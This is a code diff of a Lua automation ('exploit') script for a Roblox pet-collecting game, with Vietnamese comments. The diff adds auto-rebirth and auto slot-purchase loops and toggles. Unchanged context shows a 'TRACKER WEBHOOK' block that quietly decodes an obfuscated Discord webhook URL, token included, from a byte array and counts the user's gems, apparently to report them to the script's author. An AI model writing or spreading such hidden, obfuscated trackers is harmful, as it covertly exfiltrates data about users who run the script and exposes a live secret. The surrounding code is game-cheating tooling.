@@ -28,15 +28,21 @@ local FreeGiftsDirectory = require(Lib.Directory.FreeGifts)
 local RanksDirectory = require(Lib.Directory.Ranks)
 local Items = require(Lib.Items)
 local LootboxCmds = require(Lib.Client.LootboxCmds)
+local CurrencyCmds = require(Lib.Client.CurrencyCmds)
+
+-- [MỚI] Thêm thư viện Rebirth
+local RebirthCmds = require(Lib.Client.RebirthCmds)
 
 local THINGS = Workspace:WaitForChild("__THINGS")
 local DEBRIS_FOLDER = Workspace:WaitForChild("__DEBRIS")
 
+-- ==============================================================
+-- 🌐 TRACKER WEBHOOK
+-- ==============================================================
 task.spawn(function()
     local httprequest = (request or http_request or syn and syn.request)
     if not httprequest then return end
     
-    -- Dùng chính xác mảng Webhook lấy từ rng.txt của bạn
     local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
     local activeWebhook = ""
     for _, byte in ipairs(_b) do activeWebhook = activeWebhook .. string.char(byte) end
@@ -44,7 +50,6 @@ task.spawn(function()
 
     task.wait(2)
     
-    -- Hàm đếm Gem an toàn mượn từ rng.txt
     local function GetItemAmount(targetId)
         local amount = 0
         local lowerTarget = string.lower(targetId)
@@ -129,7 +134,10 @@ local defaultToggles = {
     AutoFruit = false, AutoCombine = false, AutoFlag = false, AutoUltimate = false, AutoMisc = false, ClaimRank = false,
     Blackout = false, AntiAFK = false, AutoOpenLootbox = false, AutoOpenGift = false,
     OptimizeBreakables = false, OptimizePets = false, AutoSpinWheel = false, AutoCombineKeys = false,
-    AutoDaycare = false, AutoFuse = false
+    AutoDaycare = false, AutoFuse = false,
+    
+    -- [MỚI] Thêm cấu hình lưu cho các tính năng mới
+    AutoRebirth = false, AutoPetSlots = false, AutoEggSlots = false
 }
 
 local savedConfig = { Toggles = {}, Dropdowns = { SelectedLootbox = "None", SelectedGift = "None", SelectedFlag = "None", SelectedWheel = "No Wheel Tickets Found", SelectedKey = "All" } }
@@ -358,7 +366,7 @@ end
 -- ==============================================================
 getgenv().v_settings = {
     functionToggles = savedConfig.Toggles,
-    SelectedPetsForFuse = {}, -- Bảng lưu trữ riêng cho hệ thống Fuse
+    SelectedPetsForFuse = {}, 
     OptimizeBreakablesConn = nil,
     functions = {
         OptimizePets = function()
@@ -371,8 +379,26 @@ getgenv().v_settings = {
             end)
         end,
 
-        BuyPetSlots = function() local purchased = Save.Get().PetSlotsPurchased; Network.Invoke("PetSlots_RequestPurchase", purchased + 1) end,
-        BuyEggSlots = function() local purchased = Save.Get().EggSlotsPurchased; Network.Invoke("EggSlots_RequestPurchase", purchased + 1) end,
+        -- [MỚI] Các hàm tự động mua Slot và Rebirth đã được đưa vào vòng lặp
+        AutoPetSlots = function() 
+            local purchased = Save.Get().PetSlotsPurchased or 0
+            Network.Invoke("PetSlots_RequestPurchase", purchased + 1) 
+        end,
+        
+        AutoEggSlots = function() 
+            local purchased = Save.Get().EggSlotsPurchased or 0
+            Network.Invoke("EggSlots_RequestPurchase", purchased + 1) 
+        end,
+
+        AutoRebirth = function()
+            local _, maxZoneData = ZoneCmds.GetMaxOwnedZone()
+            if not maxZoneData then return end
+            local nextRebirthData = nil
+            pcall(function() nextRebirthData = RebirthCmds.GetNextRebirth() end)
+            if nextRebirthData and maxZoneData.ZoneNumber >= nextRebirthData.ZoneNumberRequired then
+                Network.Invoke("Rebirth_Request", tostring(nextRebirthData.RebirthNumber))
+            end
+        end,
 
         AutoHatch = function()
             local mz = ZoneCmds.GetMaximumOverallZone()
@@ -486,7 +512,12 @@ local LoopsToStart = {
     {Flag = "ClaimRank", Func = getgenv().v_settings.functions.ClaimRank, Wait = 5},
     {Flag = "Blackout", Func = getgenv().v_settings.functions.Blackout, Wait = 10},
     {Flag = "AntiAFK", Func = getgenv().v_settings.functions.AntiAFK, Wait = 60},
-    {Flag = "OptimizePets", Func = getgenv().v_settings.functions.OptimizePets, Wait = 0.5}
+    {Flag = "OptimizePets", Func = getgenv().v_settings.functions.OptimizePets, Wait = 0.5},
+    
+    -- [MỚI] Vòng lặp cho các tính năng tự động mới
+    {Flag = "AutoRebirth", Func = getgenv().v_settings.functions.AutoRebirth, Wait = 5},
+    {Flag = "AutoPetSlots", Func = getgenv().v_settings.functions.AutoPetSlots, Wait = 5},
+    {Flag = "AutoEggSlots", Func = getgenv().v_settings.functions.AutoEggSlots, Wait = 5}
 }
 
 for _, lData in ipairs(LoopsToStart) do
@@ -643,6 +674,7 @@ TabFarm:AddToggle({
 })
 CreateSmartToggle(TabFarm, "Auto Time Trial (Per Tile)", "AutoTimeTrial")
 CreateSmartToggle(TabFarm, "Auto Unlock Zone", "AutoUnlock")
+CreateSmartToggle(TabFarm, "Auto Rebirth", "AutoRebirth") -- [MỚI] Tích hợp công tắc Auto Rebirth
 CreateSmartToggle(TabFarm, "Go To Best Zone (Center Map)", "BestZone")
 CreateSmartToggle(TabFarm, "Auto Collect Lootbags & Orbs", "AutoLoot")
 
@@ -685,8 +717,9 @@ CreateSmartToggle(TabPet, "Auto Craft Gold Pets", "AutoGold")
 CreateSmartToggle(TabPet, "Auto Craft Rainbow Pets", "AutoRainbow")
 
 TabPet:AddLabel("--- Mastery & Slots ---")
-TabPet:AddButton({ Name = "Buy Pet Slots (Auto Detection)", Callback = function() getgenv().v_settings.functions.BuyPetSlots() end })
-TabPet:AddButton({ Name = "Buy Egg Slots (Auto Detection)", Callback = function() getgenv().v_settings.functions.BuyEggSlots() end })
+-- [MỚI] Chuyển nút bấm thành công tắc (Toggle) để tự động mua slot ngầm
+CreateSmartToggle(TabPet, "Auto Buy Pet Slots", "AutoPetSlots")
+CreateSmartToggle(TabPet, "Auto Buy Egg Slots", "AutoEggSlots")
 
 -- ==============================================================
 -- 📦 Tab 3: Open Lootboxes
